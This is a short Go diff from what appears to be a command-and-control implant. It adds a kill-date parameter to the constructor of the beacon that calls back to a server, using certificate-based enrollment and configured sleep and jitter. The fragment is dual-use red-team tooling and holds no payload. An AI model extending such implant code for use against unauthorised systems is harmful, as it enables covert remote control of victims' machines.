@@ -74,7 +74,7 @@ func main() {
 	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
 	defer cancel()
 
-	b := beacon.New(beaconURL, enrollment.ImplantID, enrollment.Leaf, enrollment.CAs, cfg.Sleep, cfg.Jitter, logger)
+	b := beacon.New(beaconURL, enrollment.ImplantID, enrollment.Leaf, enrollment.CAs, cfg.Sleep, cfg.Jitter, cfg.KillDate, logger)
 	if err := b.Run(ctx); err != nil && !errors.Is(err, context.Canceled) {
 		logger.Fatalf("beacon: %v", err)
 	}
